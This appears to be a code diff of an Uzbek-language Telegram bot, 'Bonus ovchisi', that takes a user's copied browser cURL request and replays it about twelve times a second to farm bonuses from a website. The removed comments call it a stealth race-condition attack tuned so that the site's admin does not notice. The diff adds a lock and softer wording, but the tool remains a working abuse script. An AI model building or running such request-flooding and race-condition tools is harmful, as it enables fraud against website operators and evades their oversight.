@@ -3,7 +3,6 @@ import threading
 import telebot
 from telebot import types
 import requests
-import threading
 import time
 import os
 import re
@@ -16,14 +15,16 @@ app = Flask('')
 
 @app.route('/')
 def home():
-    return "Bot yoniq!"
+    return "Bot yoniq va nazorat ostida!"
 
 def run_web():
     app.run(host='0.0.0.0', port=8080)
-# Foydalanuvchilar ma'lumotlarini saqlash uchun baza (Memory)
-users_data = {}
 
-# Asosiy menyu tugmalari
+# Foydalanuvchilar ma'lumotlarini saqlash
+users_data = {}
+# Parallel oqimlarni nazorat qilish uchun qulf (Lock)
+lock = threading.Lock()
+
 def get_main_menu():
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     btn1 = types.KeyboardButton("🚀 Hujumni boshlash")
@@ -32,78 +33,67 @@ def get_main_menu():
     markup.add(btn1, btn2, btn3)
     return markup
 
-# cURL matnini tahlil qiluvchi aqlli funksiya
 def parse_curl(curl_text):
     try:
-        # URL ni ajratish
         url_match = re.search(r"curl\s+'([^']+)'", curl_text)
         url = url_match.group(1) if url_match else None
-
-        # Headerlarni (tokenlarni) ajratish
         headers = {}
         header_matches = re.findall(r"-H\s+'([^:]+):\s*([^']+)'", curl_text)
         for k, v in header_matches:
             headers[k.strip()] = v.strip()
-
-        # Data (userId) ni ajratish
         data = None
         data_match = re.search(r"--data-raw\s+'([^']+)'", curl_text)
         if data_match:
             data = json.loads(data_match.group(1))
-
         if url and headers:
             return {"url": url, "headers": headers, "data": data, "is_running": False}
-    except Exception as e:
+    except Exception:
         return None
     return None
 
-# Hujum funksiyasi (Stealth rejim)
 def attack(chat_id):
     user = users_data.get(chat_id)
     if not user:
         return
     
-    count = 0
-    # Xavfsiz poyga (Race condition): tezlikni optimal saqlaymiz
-    while user["is_running"]:
+    # Hujum boshlanishida is_running kafolatlanadi
+    while user.get("is_running"):
         try:
+            # timeout=5 so'rov osilib qolmasligi uchun
             response = requests.post(user["url"], headers=user["headers"], json=user["data"], timeout=5)
-            count += 1
-            if response.status_code == 200:
-                print(f"{chat_id} - Muvaffaqiyatli! ({count})")
-            elif response.status_code == 423:
-                # Limit tugadi
-                bot.send_message(chat_id, "⚠️ Limit tugadi (yoki sayt blokladi). Hujum to'xtatildi.")
+            
+            if response.status_code == 423:
+                bot.send_message(chat_id, "⚠️ Limit tugadi (423). Hujum to'xtatildi.")
                 user["is_running"] = False
                 break
-        except Exception as e:
-            time.sleep(1) # Aloqa uzilsa biroz kutib yana uradi
+            
+            # Agar foydalanuvchi "To'xtatish"ni bossa, darhol sikldan chiqish
+            if not user.get("is_running"):
+                break
+                
+        except Exception:
+            time.sleep(1) # Xato bo'lsa biroz kutish
             continue
         
-        # Yashirin tezlik (0.08 soniya - soniyasiga ~12 ta so'rov, adminga sezilmaydi)
-        time.sleep(0.08)
+        time.sleep(0.08) # Optimal tezlik
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    chat_id = message.chat.id
     bot.send_message(
-        chat_id, 
-        "👋 Assalomu alaykum! Men **Bonus ovchisi** botiman.\n\n"
-        "Menga brauzerdan olingan to'liq `cURL` kodingizni tashlang, qolganini o'zim hal qilaman!",
+        message.chat.id, 
+        "👋 **Bonus ovchisi** qayta tiklandi!\n\nEndi hujumlar qat'iy nazorat ostida. cURL yuboring:",
         reply_markup=get_main_menu(),
         parse_mode="Markdown"
     )
 
 @bot.message_handler(func=lambda message: message.text.startswith("curl "))
 def handle_curl(message):
-    chat_id = message.chat.id
     parsed = parse_curl(message.text)
-    
     if parsed:
-        users_data[chat_id] = parsed
-        bot.reply_to(message, "✅ cURL qabul qilindi va tahlil qilindi! Endi hujumni boshlashingiz mumkin.", reply_markup=get_main_menu())
+        users_data[message.chat.id] = parsed
+        bot.reply_to(message, "✅ cURL qabul qilindi!")
     else:
-        bot.reply_to(message, "❌ Xatolik! cURL formati noto'g'ri. Iltimos, kodni to'liq nusxalab yuboring.")
+        bot.reply_to(message, "❌ cURL noto'g'ri.")
 
 @bot.message_handler(func=lambda message: message.text in ["🚀 Hujumni boshlash", "🛑 To'xtatish", "⚙️ Sozlamalarni ko'rish"])
 def handle_menu(message):
@@ -112,35 +102,35 @@ def handle_menu(message):
 
     if message.text == "🚀 Hujumni boshlash":
         if not user:
-            bot.send_message(chat_id, "Oldin `cURL` kodni yuboring!")
+            bot.send_message(chat_id, "Oldin `cURL` yuboring!")
             return
-        if not user["is_running"]:
+        
+        # ASOSIY TO'G'IRLASH: Parallel oqim ochilishini cheklash
+        with lock:
+            if user.get("is_running"):
+                bot.send_message(chat_id, "⚠️ Hujum allaqachon ketyapti! Parallel oqim ochish bloklandi.")
+                return
             user["is_running"] = True
-            threading.Thread(target=attack, args=(chat_id,)).start()
-            bot.send_message(chat_id, "🚀 Hujum yashirin rejimda boshlandi! (Server e'tiborini tortmaslik uchun optimallashtirildi)")
-        else:
-            bot.send_message(chat_id, "Hujum allaqachon ketyapti! 🔥")
+        
+        # Daemon=True bot to'xtaganda oqimni ham yopadi
+        threading.Thread(target=attack, args=(chat_id,), daemon=True).start()
+        bot.send_message(chat_id, "🚀 Hujum boshlandi!")
 
-    elif message.text == "🛑 To'xtatish ":
-        if user and user["is_running"]:
+    elif message.text == "🛑 To'xtatish":
+        if user and user.get("is_running"):
             user["is_running"] = False
-            bot.send_message(chat_id, "🛑 Hujum to'xtatildi. ✅")
+            bot.send_message(chat_id, "🛑 To'xtatish buyrug'i yuborildi. ✅")
         else:
             bot.send_message(chat_id, "Hozir hech qanday hujum ketmayapti.")
 
     elif message.text == "⚙️ Sozlamalarni ko'rish":
         if user:
-            url_short = user["url"].split("/")[-1]
-            bot.send_message(chat_id, f"📊 **Joriy sozlamalar:**\n\nManzil: `.../{url_short}`\nID: `{user['data'].get('userId', 'Noma\'lum')}`\nHolat: {'Ishlamoqda 🟢' if user['is_running'] else 'To\'xtatilgan 🔴'}", parse_mode="Markdown")
+            bot.send_message(chat_id, f"📊 Holat: {'Ishlamoqda 🟢' if user['is_running'] else 'To\'xtatilgan 🔴'}")
         else:
-            bot.send_message(chat_id, "Siz hali `cURL` kod kiritmagansiz.")
+            bot.send_message(chat_id, "Ma'lumot yo'q.")
 
-# Bot o'chib qolmasligi uchun himoya
 if __name__ == "__main__":
-    # Veb-serverni alohida oqimda ishga tushirish
-    threading.Thread(target=run_web).start()
-    
-    # Botning asosiy sikli
+    threading.Thread(target=run_web, daemon=True).start()
     while True:
         try:
             bot.polling(none_stop=True, interval=0, timeout=20)
